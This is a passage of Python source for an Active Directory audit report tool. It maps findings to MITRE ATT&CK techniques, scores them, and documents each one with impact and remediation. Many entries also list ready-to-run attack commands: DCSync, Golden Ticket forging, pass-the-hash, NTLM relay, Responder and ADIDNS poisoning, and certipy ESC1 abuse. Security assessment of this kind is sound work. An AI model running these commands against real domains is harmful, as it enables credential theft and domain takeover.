    "P-AdminNum":3, "P-AdminPwdTooOld":3, "S-SMB-v1":3, "A-MinPwdLen":3,
    "A-PwdComplexity":3, "P-ProtectedUsers":3, "A-NTLMAudit":3, "A-Guest":3,
    "S-OS-XP":3, "S-OS-Vista":3, "S-OS-NT":3, "P-LogonDenied":3, "A-DSRMLogon":3,
    # Level 4 — managed
    "A-AuditDC":4, "A-AuditPowershell":4, "A-PowerShellLogging":4, "P-RecycleBin":4,
    "S-KerberosArmoring":4, "A-PrivilegeAudit":4, "A-PowerShellTranscript":4,
    "A-BackupMetadata":4, "S-FunctionalLevel4":4,
    # Level 5 — optimizing / minor
    "A-NotEnoughDC":5, "S-DC-SubnetMissing":5, "P-UnprotectedOU":5, "S-PrimaryGroup":5,
    "S-C-PrimaryGroup":5, "S-Duplicate":5, "S-Domain$$$":5, "P-OperatorsEmpty":5,
}

def rule_maturity(rule_id: str, severity: str) -> int:
    return RULE_MATURITY.get(rule_id, SEV_TO_MATURITY.get(severity, 3))

# ── MITRE ATT&CK technique mapping (rule_id -> ["Txxxx[.yyy]: Name", …]) ───────
RULE_MITRE: Dict[str, List[str]] = {
    "A-Krbtgt": ["T1558.001: Golden Ticket"],
    "S-Kerberoastable": ["T1558.003: Kerberoasting"],
    "S-KerberoastableAdmin": ["T1558.003: Kerberoasting"],
    "P-Kerberoasting": ["T1558.003: Kerberoasting"],
    "S-NoPreAuth": ["T1558.004: AS-REP Roasting"],
    "S-NoPreAuthAdmin": ["T1558.004: AS-REP Roasting"],
    "P-DCSync": ["T1003.006: DCSync"],
    "P-DangerousACLDomain": ["T1003.006: DCSync", "T1222.001: ACL Modification"],
    "A-ReversiblePwd": ["T1003: OS Credential Dumping"],
    "S-Reversible": ["T1003: OS Credential Dumping"],
    "A-LMHashAuthorized": ["T1003: OS Credential Dumping"],
    "A-WDigest": ["T1003.001: LSASS Memory"],
    "A-LMCompatibilityLevel": ["T1557: Adversary-in-the-Middle", "T1187: Forced Authentication"],
    "P-GPPPassword": ["T1552.006: Group Policy Preferences"],
    "A-LAPS-Not-Installed": ["T1078: Valid Accounts", "T1003: Credential Dumping"],
    "A-LocalAdminPassword": ["T1078: Valid Accounts"],
    "P-UnconstrainedDelegation": ["T1558: Steal/Forge Kerberos Tickets", "T1187: Forced Authentication"],
    "P-RBCD": ["T1558.003: Kerberos Delegation", "T1098: Account Manipulation"],
    "P-RBCD-Dangerous": ["T1098: Account Manipulation", "T1134.001: Token Impersonation"],
    "P-ConstrainedDelegService": ["T1558: Steal/Forge Kerberos Tickets"],
    "P-DelegationDCt2a4d": ["T1134.001: Token Impersonation/Theft"],
    "P-MachineAccountQuota": ["T1136: Create Account", "T1098: Account Manipulation"],
    "A-CertTempCustomSubject": ["T1649: Steal/Forge Authentication Certificates (ESC1)"],
    "A-CertTempAnyPurpose": ["T1649: Authentication Certificates (ESC2)"],
    "A-CertTempAgent": ["T1649: Authentication Certificates (ESC3)"],
    "A-CertTemplateESC4": ["T1649: Authentication Certificates (ESC4)", "T1222.001: ACL Modification"],
    "A-CertEnrollHttp": ["T1649: Authentication Certificates (ESC8)", "T1557: AiTM/Relay"],
    "A-CertROCA": ["T1649: Authentication Certificates"],
    "A-DC-Coerce": ["T1187: Forced Authentication", "T1557.001: LLMNR/NBT-NS+SMB Relay"],
    "A-DC-Spooler": ["T1187: Forced Authentication (PrinterBug)"],
    "A-DC-WebClient": ["T1187: Forced Authentication (WebClient)"],
    "A-LLMNR": ["T1557.001: LLMNR/NBT-NS Poisoning"],
    "A-NBTNSDisabled": ["T1557.001: LLMNR/NBT-NS Poisoning"],
    "A-DCLdapSign": ["T1557: Adversary-in-the-Middle (LDAP Relay)"],
    "A-DCLdapsChannelBinding": ["T1557: Adversary-in-the-Middle (LDAPS Relay)"],
    "A-LDAPSigningDisabled": ["T1557: Adversary-in-the-Middle (LDAP Relay)"],
    "A-SMB2SignatureNotRequired": ["T1557.001: SMB Relay"],
    "A-SMB2SignatureNotEnabled": ["T1557.001: SMB Relay"],
    "A-NullSession": ["T1087.002: Account Discovery (Domain)", "T1069.002: Permission Group Discovery"],
    "A-PreWin2000Anonymous": ["T1087.002: Account Discovery (Domain)"],
    "A-RestrictRemoteSAM": ["T1087.002: Account Discovery (Domain)"],
    "A-NTLMAudit": ["T1557: Adversary-in-the-Middle"],
    "S-SIDHistory": ["T1134.005: SID-History Injection"],
    "S-SIDHistoryPrivileged": ["T1134.005: SID-History Injection"],
    "T-SIDHistoryDangerous": ["T1134.005: SID-History Injection"],
    "T-SIDFiltering": ["T1134.005: SID-History Injection", "T1199: Trusted Relationship"],
    "T-TGTDelegation": ["T1199: Trusted Relationship", "T1550.003: Pass-the-Ticket"],
    "T-AzureADSSO": ["T1199: Trusted Relationship", "T1556: Modify Authentication Process"],
    "P-ServiceDomainAdmin": ["T1078: Valid Accounts", "T1558.003: Kerberoasting"],
    "A-MembershipEveryone": ["T1078: Valid Accounts", "T1098: Account Manipulation"],
    "P-ComputerInPrivGroup": ["T1078: Valid Accounts"],
    "P-ModifiableGPO": ["T1484.001: Group Policy Modification"],
    "P-DangerousACLGPO": ["T1484.001: Group Policy Modification"],
    "P-WriteToPrivGroup": ["T1098: Account Manipulation", "T1222.001: ACL Modification"],
    "P-DangerousExtendedRight": ["T1222.001: ACL Modification"],
    "P-AdminCountOrphan": ["T1078: Valid Accounts"],
    "A-BadSuccessor": ["T1098: Account Manipulation (dMSA)"],
    "A-DnsZoneAUCreateChild": ["T1557: Adversary-in-the-Middle (ADIDNS)", "T1584: Compromise Infrastructure"],
    "A-DnsZoneUpdate1": ["T1557: Adversary-in-the-Middle (ADIDNS)"],
    "A-WSUS-HTTP": ["T1195.002: Supply Chain Compromise", "T1557: AiTM"],
    "S-SMB-v1": ["T1210: Exploitation of Remote Services"],
    "S-Vuln-MS17_010": ["T1210: Exploitation of Remote Services (EternalBlue)"],
    "S-Vuln-MS14-068": ["T1558: Forge Kerberos Tickets (PAC)"],
    "P-DNSAdmin": ["T1574: Hijack Execution Flow (DLL)"],
    "A-DSRMLogon": ["T1556: Modify Authentication Process", "T1078.001: Default Accounts"],
    "P-RecoveryModeUnprotected": ["T1556: Modify Authentication Process"],
    "S-DesEnabled": ["T1558.003: Kerberoasting (DES)"],
    "A-AeA": ["T1558: Steal/Forge Kerberos Tickets"],
    "A-SCCM": ["T1557.001: SMB Relay", "T1078: Valid Accounts (NAA)", "T1602: Data from Config Repo"],
    "A-SCCMContainerACL": ["T1222.001: ACL Modification", "T1557.001: SMB Relay"],
    "A-CertCAManageLowPriv": ["T1649: Authentication Certificates (ESC7)"],
    "A-CertTemplateESC9": ["T1649: Authentication Certificates (ESC9)"],
    "P-ControlPathDA": ["T1222.001: ACL Modification", "T1098: Account Manipulation"],
    "P-ControlPathIndirectEveryone": ["T1222.001: ACL Modification"],
    "P-ControlPathIndirectMany": ["T1222.001: ACL Modification"],
    "A-Pre2kComputer": ["T1078: Valid Accounts", "T1110: Brute Force"],
    "A-WeakLockout": ["T1110.003: Password Spraying"],
    "P-ExchangePrivEsc": ["T1222.001: ACL Modification", "T1098: Account Manipulation"],
    "P-GMSAReadable": ["T1555: Credentials from Password Stores", "T1078: Valid Accounts"],
    "A-KDSRootKey": ["T1555: Credentials from Password Stores", "T1098: Account Manipulation"],
    "A-AADConnectSync": ["T1078.004: Cloud Accounts", "T1003.006: DCSync"],
    "A-SeamlessSSO": ["T1550.003: Pass-the-Ticket", "T1078.004: Cloud Accounts"],
}

# ── Graduated scoring: rule_id -> (points_per_affected, cap). When present, a
# rule's contribution scales with the number of affected objects up to the cap,
# falling back to flat points otherwise. ─
RULE_SCALE: Dict[str, Tuple[int, int]] = {
    "S-Inactive":        (1, 25),
    "S-C-Inactive":      (1, 25),
    "S-PwdNeverExpires": (1, 20),
    "S-PwdNotRequired":  (3, 30),
    "S-PwdLastSet-45":   (1, 15),
    "S-PwdLastSet-90":   (1, 20),
    "S-SIDHistory":      (2, 20),
    "S-AesNotEnabled":   (1, 15),
    "P-Kerberoasting":   (10, 50),
    "S-Kerberoastable":  (5, 40),
    "P-AdminNum":        (3, 40),
}

def scaled_points(rule_id: str, base_points: int, n_affected: int) -> int:
    """Return graduated points for a rule given how many objects it affects."""
    if rule_id in RULE_SCALE and n_affected > 0:
        per, cap = RULE_SCALE[rule_id]
        return max(base_points, min(cap, per * n_affected))
    return base_points

# ── Operational categories — how a pentester groups findings during an engagement
#    (not the internal A/P/S/T taxonomy). Used only for report grouping/filtering.
OPCAT_ORDER = ["Privilege Escalation", "Credential Access", "Lateral Movement",
               "Persistence", "Recon & Exposure", "Hygiene & Legacy"]
OPCAT_COLOR = {
    "Privilege Escalation":"#bd4234", "Credential Access":"#cb7a2f",
    "Lateral Movement":"#5d7a86", "Persistence":"#8a6d4f",
    "Recon & Exposure":"#6f8f3f", "Hygiene & Legacy":"#8c917a",
}
OP_CATEGORY = {
    # Privilege escalation → Tier 0
    "P-DCSync":"Privilege Escalation","P-DangerousACLDomain":"Privilege Escalation",
    "P-DangerousACLDA":"Privilege Escalation","P-DangerousACLGPO":"Privilege Escalation",
    "P-WriteToPrivGroup":"Privilege Escalation","P-OwnsPrivObject":"Privilege Escalation",
    "P-ModifiableGPO":"Privilege Escalation","P-ServiceDomainAdmin":"Privilege Escalation",
    "P-ComputerInPrivGroup":"Privilege Escalation","P-UnconstrainedDelegation":"Privilege Escalation",
    "P-ConstrainedDelegService":"Privilege Escalation","P-RBCD":"Privilege Escalation",
    "P-RBCD-Dangerous":"Privilege Escalation","P-DelegationDCt2a4d":"Privilege Escalation",
    "P-DelegationDCa2d2":"Privilege Escalation","P-DangerousExtendedRight":"Privilege Escalation",
    "P-MachineAccountQuota":"Privilege Escalation","P-DNSAdmin":"Privilege Escalation",
    "P-ExchangePrivEsc":"Privilege Escalation","A-MembershipEveryone":"Privilege Escalation",
    "P-AdminNum":"Privilege Escalation","P-SchemaAdmin":"Privilege Escalation",
    "A-AdminSDHolder":"Privilege Escalation","P-DelegationEveryone":"Privilege Escalation",
    "P-PrivilegeEveryone":"Privilege Escalation","A-BadSuccessor":"Privilege Escalation",
    "A-CertTempCustomSubject":"Privilege Escalation","A-CertTempAnyPurpose":"Privilege Escalation",
    "A-CertTempAgent":"Privilege Escalation","A-CertTemplateESC4":"Privilege Escalation",
    "A-CertEnrollHttp":"Privilege Escalation","A-CertCAManageLowPriv":"Privilege Escalation",
    "A-CertTemplateESC9":"Privilege Escalation","P-ControlPathDA":"Privilege Escalation",
    "P-ControlPathIndirectEveryone":"Privilege Escalation","P-ControlPathIndirectMany":"Privilege Escalation",
    "P-GMSAReadable":"Privilege Escalation",
    # Credential access / harvesting
    "A-KDSRootKey":"Credential Access","A-AADConnectSync":"Credential Access",
    "A-SeamlessSSO":"Lateral Movement","S-OrphanedGPO":"Hygiene & Legacy",
    "P-GPPPassword":"Credential Access","A-LAPS-Not-Installed":"Credential Access",
    "A-LAPS-Joined-Computers":"Credential Access","A-LocalAdminPassword":"Credential Access",
    "A-ReversiblePwd":"Credential Access","S-Reversible":"Credential Access",
    "S-C-Reversible":"Credential Access","A-LMHashAuthorized":"Credential Access",
    "A-WDigest":"Credential Access","S-Kerberoastable":"Credential Access",
    "S-KerberoastableAdmin":"Credential Access","P-Kerberoasting":"Credential Access",
    "S-NoPreAuth":"Credential Access","S-NoPreAuthAdmin":"Credential Access",
    "S-DesEnabled":"Credential Access","P-AdminCountOrphan":"Credential Access",
    "A-Pre2kComputer":"Credential Access",
    # Lateral movement / relay / coercion
    "A-DCLdapSign":"Lateral Movement","A-DCLdapsChannelBinding":"Lateral Movement",
    "A-LDAPSigningDisabled":"Lateral Movement","A-SMB2SignatureNotRequired":"Lateral Movement",
    "A-SMB2SignatureNotEnabled":"Lateral Movement","A-LLMNR":"Lateral Movement",
    "A-NBTNSDisabled":"Lateral Movement","A-LMCompatibilityLevel":"Lateral Movement",
    "A-DC-Spooler":"Lateral Movement","A-DC-WebClient":"Lateral Movement",
    "A-DC-Coerce":"Lateral Movement","A-WSUS-HTTP":"Lateral Movement","A-SCCM":"Lateral Movement",
    "S-SMB-v1":"Lateral Movement","S-Vuln-MS17_010":"Lateral Movement","A-HardenedPaths":"Lateral Movement",
    "A-DnsZoneAUCreateChild":"Lateral Movement","A-DnsZoneUpdate1":"Lateral Movement",
    "T-SIDFiltering":"Lateral Movement","T-TGTDelegation":"Lateral Movement","T-AzureADSSO":"Lateral Movement",
    "T-Downlevel":"Lateral Movement","A-SCCMContainerACL":"Lateral Movement",
    # Persistence
    "A-Krbtgt":"Persistence","S-SIDHistory":"Persistence","S-SIDHistoryPrivileged":"Persistence",
    "T-SIDHistoryDangerous":"Persistence","A-DSRMLogon":"Persistence","S-Vuln-MS14-068":"Persistence",
    # Recon & exposure
    "A-NullSession":"Recon & Exposure","A-RootDseAnonBinding":"Recon & Exposure",
    "A-PreWin2000Anonymous":"Recon & Exposure","A-PreWin2000AuthenticatedUsers":"Recon & Exposure",
    "A-PreWin2000Other":"Recon & Exposure","A-DsHeuristicsAnonymous":"Recon & Exposure",
    "A-RestrictRemoteSAM":"Recon & Exposure","A-Guest":"Recon & Exposure",
    # Hygiene & legacy
    "A-MinPwdLen":"Hygiene & Legacy","A-PwdComplexity":"Hygiene & Legacy","A-PwdHistory":"Hygiene & Legacy",
    "A-PwdMaxAge":"Hygiene & Legacy","A-PwdGPO":"Hygiene & Legacy","A-WeakLockout":"Hygiene & Legacy",
    "S-Inactive":"Hygiene & Legacy","S-C-Inactive":"Hygiene & Legacy","S-DC-Inactive":"Hygiene & Legacy",
    "S-DC-NotUpdated":"Hygiene & Legacy","S-PwdNeverExpires":"Hygiene & Legacy",
    "S-PwdNotRequired":"Hygiene & Legacy","S-PwdLastSet-45":"Hygiene & Legacy",
    "S-PwdLastSet-90":"Hygiene & Legacy","S-PwdLastSet-DC":"Hygiene & Legacy",
    "S-AesNotEnabled":"Hygiene & Legacy","A-AeA":"Hygiene & Legacy","S-OS-XP":"Hygiene & Legacy",
    "S-OS-Vista":"Hygiene & Legacy","S-OS-NT":"Hygiene & Legacy","S-OS-W10":"Hygiene & Legacy",
    "S-FunctionalLevel1":"Hygiene & Legacy","S-FunctionalLevel3":"Hygiene & Legacy",
    "P-Inactive":"Hygiene & Legacy","P-AdminPwdTooOld":"Hygiene & Legacy","P-ProtectedUsers":"Hygiene & Legacy",
}
def op_category(rule_id: str, category: str) -> str:
    if rule_id in OP_CATEGORY:
        return OP_CATEGORY[rule_id]
    # sensible fallback by internal category
    return {"Privileged":"Privilege Escalation","Stale":"Hygiene & Legacy",
            "Trust":"Lateral Movement"}.get(category, "Recon & Exposure")

# Findings that are not actionable on an offensive engagement (DR/availability/
# defensive-logging hygiene). Suppressed so the report stays operator-relevant.
SUPPRESSED_RULES = {
    "P-RecycleBin", "A-NotEnoughDC", "S-KerberosArmoring", "S-KerberosArmoringDC",
    "A-PowerShellLogging", "A-PowerShellTranscript", "A-CredentialGuard",
    "A-AuditPowershell", "A-AuditDC", "A-PrivilegeAudit", "A-NTLMAudit",
    "P-UnprotectedOU", "S-DC-SubnetMissing", "S-PrimaryGroup", "S-C-PrimaryGroup",
    "S-Duplicate", "S-Domain$$$", "A-SmartCardPwdRotation", "A-SmartCardRequired",
    "A-NoServicePolicy", "A-BackupMetadata", "S-DefaultOUChanged", "S-JavaSchema",
    "S-TerminalServicesGPO", "S-ADRegistration", "S-FolderOptions", "S-FirewallScript",
    "S-DefenderASR", "P-OperatorsEmpty", "A-DnsZoneTransfert", "A-DnsZoneUpdate2",
}

# ─────────────────────────────────────────────────────────────────────────────
# RULE DOCUMENTATION — pentester-focused detail surfaced in the report's
# per-finding expand panel. Keys = rule_id. Each entry may set:
#   description : One-sentence summary of what the finding represents.
#   why         : Why it matters from an attacker / defender perspective.
#   technical   : Attribute, registry key, ACE, or RFC reference.
#   exploit     : List of concrete commands / steps for exploitation.
#   remediation : List of concrete fix steps / commands.
#   refs        : List of reference URLs.
# Any field may be omitted; report falls back to the Finding.details string.
# ─────────────────────────────────────────────────────────────────────────────
RULE_DOCS: Dict[str, Dict[str, Any]] = {
    # ── Anomaly ────────────────────────────────────────────────────────────
    "A-Krbtgt": {
        "description": "The KRBTGT account password has not been rotated within the last 180 days.",
        "why": "Forged Kerberos tickets (Golden Tickets) signed with an old KRBTGT key remain valid until the next rotation. A single historical DC compromise grants persistent domain access.",
        "technical": "krbtgt pwdLastSet; rotation is recommended every 180 days, twice in succession (24h apart) to invalidate cached tickets.",
        "exploit": [
            "mimikatz \"lsadump::dcsync /domain:DOMAIN /user:krbtgt\"",
            "mimikatz \"kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-... /krbtgt:<NT-hash> /id:500 /ptt\"",
            "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain DOMAIN -spn cifs/dc.domain.local Administrator",
        ],
        "remediation": [
            "Download Microsoft's New-KrbtgtKeys.ps1 (Reset-KrbtgtKeyInteractiveWorkflow).",
            "Run reset, wait 24h for replication, run reset again.",
            "Schedule rotation at least every 180 days as policy.",
        ],
    },
    "A-LAPS-Not-Installed": {
        "description": "LAPS schema attributes (ms-Mcs-AdmPwd or msLAPS-Password) were not found.",
        "why": "Without LAPS, the local Administrator password is typically reused across endpoints. Capturing one machine's SAM yields lateral movement domain-wide.",
        "technical": "Check ms-Mcs-AdmPwd / msLAPS-Password / msLAPS-EncryptedPassword schema presence.",
        "exploit": [
            "After capturing one local-admin hash, pass-the-hash to all workstations: nxc smb <range> -u Administrator -H <NTLM>",
            "secretsdump.py -hashes :<NTLM> 'DOMAIN/Administrator@host'",
        ],
        "remediation": [
            "Deploy Microsoft LAPS (Windows LAPS shipped in Win11 22H2+, downloadable for older OS).",
            "Audit ACL on ms-Mcs-AdmPwd to grant Read only to defined help-desk groups.",
            "Set password policy: 14+ chars, all complexity, 30 day rotation.",
        ],
    },
    "A-LAPS-Joined-Computers": {
        "description": "Enabled workstation/server objects have no LAPS expiration recorded.",
        "why": "Machines whose ms-Mcs-AdmPwdExpirationTime is empty either never received the LAPS GPO or the LAPS client is broken — they likely still share a static local-admin password with the rest of the estate.",
        "technical": "ms-Mcs-AdmPwdExpirationTime / msLAPS-PasswordExpirationTime empty or 0.",
        "remediation": [
            "Ensure the LAPS GPO is linked and applied (gpresult /r).",
            "Verify LAPS CSE is installed on the affected hosts.",
            "Force-rotate by clearing ms-Mcs-AdmPwdExpirationTime on the computer object.",
        ],
    },
    "A-NullSession": {
        "description": "Anonymous LDAP bind can enumerate domain objects on this DC.",
        "why": "Allows fully unauthenticated user/computer/group enumeration — a recon goldmine and a prerequisite for many follow-on attacks (Kerberoast targeting, ASREP-roast, etc.).",
        "technical": "Anonymous bind succeeded and returned non-empty results for (objectClass=user).",
        "exploit": [
            "ldapsearch -x -H ldap://<dc> -b 'dc=domain,dc=local' '(objectClass=user)' sAMAccountName",
            "nxc ldap <dc> -u '' -p '' --users",
        ],
        "remediation": [
            "Set dsHeuristics 7th character to 0 (default — disable anonymous LDAP).",
            "Remove 'Authenticated Users' from 'Pre-Windows 2000 Compatible Access'.",
            "Block port 389 from non-trusted networks.",
        ],
    },
    "A-PreWin2000AuthenticatedUsers": {
        "description": "'Authenticated Users' is a member of 'Pre-Windows 2000 Compatible Access'.",
        "why": "Every domain user can read otherwise sensitive attributes (e.g., tokenGroupsGlobalAndUniversal) and can enumerate the domain in ways that are normally restricted. Many third-party scanners depend on this misconfig — but so do attackers.",
        "technical": "Group SID S-1-5-32-554 should contain only 'Authenticated Users' on demand-upgraded domains; remove on green-field deployments.",
        "exploit": [
            "ldeep ldap -d DOMAIN -u user -p pass -s ldap://<dc> all",
            "Enumerate password policy + tokenGroups without elevated rights",
        ],
        "remediation": [
            "Remove 'Authenticated Users' from Pre-Windows 2000 Compatible Access — only retain if a legitimate legacy app depends on it (rare in 2025).",
        ],
    },
    "A-PreWin2000Anonymous": {
        "description": "Anonymous / Everyone is a member of Pre-Windows 2000 Compatible Access.",
        "why": "Unauthenticated SAM lookups (LSARPC/SAMR) and partial LDAP enumeration become possible.",
        "remediation": [
            "net localgroup 'Pre-Windows 2000 Compatible Access' '<account>' /delete on the DC.",
        ],
    },
    "A-Guest": {
        "description": "The built-in Guest account is enabled.",
        "why": "Provides an unauthenticated authentication primitive that many tools (RPC, SMB, LDAP) implicitly trust.",
        "remediation": [
            "Disable Guest: net user Guest /active:no (on each DC).",
            "Audit Guest password (frequently blank).",
        ],
    },
    "A-MinPwdLen": {
        "description": "Domain minimum password length is below 8 characters.",
        "why": "Allows trivially-bruteforceable passwords. Combined with Kerberoasting / ASREP-roast yields offline cracking in minutes.",
        "technical": "domain object minPwdLength attribute.",
        "exploit": [
            "Use cracked Kerberoast/ASREP hashes against hashcat with -O -m 13100 / -m 18200.",
        ],
        "remediation": [
            "Set-ADDefaultDomainPasswordPolicy -MinPasswordLength 14",
            "Layer with PSO for service accounts (25+).",
        ],
    },
    "A-PwdComplexity": {
        "description": "Password complexity requirement is not enforced.",
        "why": "Single character-class passwords are trivial to spray and crack offline.",
        "technical": "pwdProperties bit 0 (DOMAIN_PASSWORD_COMPLEX) is clear.",
        "remediation": [
            "Set-ADDefaultDomainPasswordPolicy -ComplexityEnabled $true",
        ],
    },
    "A-PwdHistory": {
        "description": "Password history length is below the recommended value (24).",
        "why": "Users can quickly cycle back to a previously-known password — minimizing rotation's effectiveness against captured hashes.",
        "remediation": [
            "Set-ADDefaultDomainPasswordPolicy -PasswordHistoryCount 24",
        ],
    },
    "A-PwdMaxAge": {
        "description": "Domain maxPwdAge is set to never (or > 2 years).",
        "why": "Captured hashes remain valid indefinitely. Even strong policies degrade quickly once a credential is breached.",
        "technical": "domain object maxPwdAge — a value of -9223372036854775808 (or any large negative number) means never-expire.",
        "remediation": [
            "Set-ADDefaultDomainPasswordPolicy -MaxPasswordAge 365.00:00:00",
            "Pair with stronger min-length / passphrase guidance.",
        ],
    },
    "A-ReversiblePwd": {
        "description": "Enabled accounts have 'Store passwords using reversible encryption'.",
        "why": "Any DC-side credential dump (DCSync, ntdsutil) yields plaintext passwords for these accounts.",
        "exploit": [
            "mimikatz \"lsadump::dcsync /domain:DOMAIN /user:<account>\" — reads CLEAR_LOGON entries.",
            "impacket-secretsdump 'DOMAIN/user:pass@dc' -just-dc",
        ],
        "remediation": [
            "Set-ADUser <user> -AllowReversiblePasswordEncryption $false; then reset the password.",
        ],
    },
    "A-LMHashAuthorized": {
        "description": "LM-hash storage may still be active on the domain.",
        "why": "LM hashes can be brute-forced in minutes on commodity hardware (DES, 7-byte halves).",
        "remediation": [
            "Group Policy: Computer Config → Windows Settings → Local Policies → Security Options → 'Network security: Do not store LAN Manager hash value on next password change' = Enabled.",
            "Force password reset on every enabled account so the LM half is wiped from NTDS.dit.",
        ],
    },
    "A-DsHeuristicsAnonymous": {
        "description": "dsHeuristics 7th character is '2' — anonymous LDAP operations are enabled.",
        "why": "Anyone can query the directory without credentials.",
        "remediation": [
            "Clear position 7 in dsHeuristics on CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration.",
        ],
    },
    "A-DCLdapSign": {
        "description": "LDAP signing not enforced on the domain controller.",
        "why": "Permits NTLM relay onto LDAP (ntlmrelayx --remove-mic + LDAP relay) → arbitrary AD modifications.",
        "remediation": [
            "Set 'Domain controller: LDAP server signing requirements' = 'Require signing' via Default Domain Controllers GPO.",
        ],
    },
    "A-DCLdapsChannelBinding": {
        "description": "LDAPS channel binding (EPA) is not enabled.",
        "why": "Allows NTLM relay to LDAPS — pre-channel-binding fix (KB5005112).",
        "exploit": [
            "impacket-ntlmrelayx -t ldaps://<dc> --no-validate-privs",
        ],
        "remediation": [
            "Configure Domain controller: LDAP server channel binding token requirements = Always.",
            "Apply March 2024 LDAP channel-binding enforcement (KB5021130).",
        ],
    },
    "A-SMB2SignatureNotRequired": {
        "description": "SMB signing is not REQUIRED on the domain controller.",
        "why": "Enables SMB relay onto file/admin shares — historically PrintNightmare/PetitPotam pivots.",
        "exploit": [
            "impacket-ntlmrelayx -t smb://<target> -c 'whoami /priv'",
            "PetitPotam.py + ntlmrelayx --escalate-user user@domain",
        ],
        "remediation": [
            "Set 'Microsoft network server: Digitally sign communications (always)' = Enabled via DC Policy.",
        ],
    },
    "A-MembershipEveryone": {
        "description": "Everyone / Authenticated Users / Anonymous Logon are members of a privileged group.",
        "why": "Any logged-in user (potentially unauthenticated) inherits administrative power — domain-instant-pwn.",
        "remediation": [
            "Remove these well-known SIDs from the listed group immediately.",
        ],
    },
    "A-ProtectedUsers": {
        "description": "Privileged accounts are NOT members of Protected Users.",
        "why": "Without Protected Users, admin TGTs are long-lived, RC4 is allowed, and the credential delegation cache is reachable — Mimikatz dumps cleartext.",
        "remediation": [
            "Add-ADGroupMember -Identity 'Protected Users' -Members <admin>",
            "Note: Protected Users requires DFL ≥ 2012 R2 and breaks NTLM/digest for those accounts.",
        ],
    },
    "A-DnsZoneUpdate1": {
        "description": "DNS zone permits insecure dynamic updates.",
        "why": "Anyone (or any computer) can register DNS records → ADIDNS poisoning (wpad, etc.) → relay credentials.",
        "exploit": [
            "Invoke-DNSUpdate.ps1 -DNSType A -DNSName wpad -DNSData <attacker>",
            "krbrelayx dnstool.py -u DOMAIN\\user -p pass --action add --record wpad --data <attacker IP> <dc>",
        ],
        "remediation": [
            "Set the zone's update policy to 'Secure only' via DNS Manager.",
            "Remove broad ACEs from the dnsZone object's nTSecurityDescriptor.",
        ],
    },
    "A-DnsZoneAUCreateChild": {
        "description": "Authenticated Users can create dnsNode child objects in this AD-integrated zone.",
        "why": "Permits any domain user to add A/CNAME records → wpad/ADIDNS spoofing → NTLM relay.",
        "exploit": [
            "krbrelayx dnstool.py -u 'DOMAIN\\user' -p 'pass' --action add --record <wpad> --data <attacker-ip> <dc>",
        ],
        "remediation": [
            "Audit zone DACL; remove the CreateChild ACE for Authenticated Users.",
            "Enable the DnsAdmins-only secure-zone-update model where possible.",
        ],
    },
    "A-NoGPOLLMNR": {
        "description": "LLMNR is not disabled via Group Policy.",
        "why": "Responder picks up unresolved name queries on every client subnet, capturing NTLMv1/v2 challenge-responses.",
        "exploit": [
            "responder -I eth0 -wd",
            "ntlmrelayx + responder for relay-while-poisoning",
        ],
        "remediation": [
            "Computer Config → Admin Templates → Network → DNS Client → 'Turn off multicast name resolution' = Enabled.",
        ],
    },
    "A-WDigest": {
        "description": "WDigest UseLogonCredential is set to 1 — cleartext credentials cached in LSASS.",
        "why": "Mimikatz / Rubeus dump cleartext passwords trivially from memory.",
        "exploit": [
            "mimikatz \"sekurlsa::wdigest\"",
        ],
        "remediation": [
            "Set HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential=0 via GPO.",
        ],
    },
    "A-LMCompatibilityLevel": {
        "description": "LmCompatibilityLevel is below 3 — NTLMv1 is allowed.",
        "why": "NTLMv1 challenge-response can be cracked to NT hash via crack.sh; relays preserve hash material.",
        "exploit": [
            "Use Responder --lm to capture, then crack.sh or hashcat -m 5500.",
        ],
        "remediation": [
            "Set LmCompatibilityLevel = 5 ('Send NTLMv2 response only. Refuse LM & NTLM') via Default Domain GPO.",
        ],
    },
    "A-LLMNR": {
        "description": "LLMNR EnableMulticast is not 0 via GPO.",
        "why": "Same impact as A-NoGPOLLMNR — Responder credential capture.",
        "remediation": [
            "Apply GPO setting EnableMulticast=0 in HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\DNSClient.",
        ],
    },
    "A-NBTNSDisabled": {
        "description": "NetBIOS-over-TCP/IP is not disabled — NodeType ≠ 2.",
        "why": "Allows NBT-NS poisoning (Responder -I), same impact as LLMNR.",
        "remediation": [
            "Set HKLM\\SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters\\NodeType = 2.",
            "Disable NetBIOS in NIC IPv4 advanced settings via GPO/DHCP option 1.",
        ],
    },
    "A-HardenedPaths": {
        "description": "UNC hardened paths for \\\\*\\SYSVOL and \\\\*\\NETLOGON are not configured.",
        "why": "MS15-011/MS15-014 bypass — attacker on path can serve malicious GPO/startup scripts.",
        "remediation": [
            "Computer Config → Admin Templates → Network → Network Provider → Hardened UNC Paths:",
            "  \\\\*\\SYSVOL = RequireMutualAuthentication=1, RequireIntegrity=1",
            "  \\\\*\\NETLOGON = RequireMutualAuthentication=1, RequireIntegrity=1",
        ],
    },
    "A-CredentialGuard": {
        "description": "Credential Guard (VBS LSA isolation) is not enforced via GPO.",
        "why": "Without CG, LSASS is readable by SYSTEM → Mimikatz extracts NT hashes / TGTs.",
        "remediation": [
            "Enable via GPO: Device Guard → Turn On Virtualization Based Security → Credential Guard Configuration = Enabled with UEFI lock.",
        ],
    },
    "A-WSUS-HTTP": {
        "description": "WSUS WUServer is HTTP (not HTTPS).",
        "why": "On-path attacker can inject signed-by-MS updates (no validation of channel) → SYSTEM on every patching client.",
        "exploit": [
            "WSUSpicious / SharpWSUS / wsuxploit — replace update with PsExec to add local admin.",
        ],
        "remediation": [
            "Reconfigure WSUS to use HTTPS (8531). Update WUServer/WUStatusServer GPO values to https://... and bind a trusted certificate to the WSUS site.",
        ],
    },
    "A-CertTempCustomSubject": {
        "description": "ESC1 — certificate template allows enrollee-supplied Subject and authentication EKU without manager approval.",
        "why": "Request a certificate for 'CN=Administrator' and PKINIT-authenticate as Domain Admin.",
        "exploit": [
            "certipy find -u user@domain -p pass -dc-ip <dc>",
            "certipy req -u user@domain -p pass -ca <CA> -template <tmpl> -upn administrator@domain",
            "certipy auth -pfx administrator.pfx",
        ],
        "remediation": [
            "Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on the template (Properties → Subject Name → Build from this AD information).",
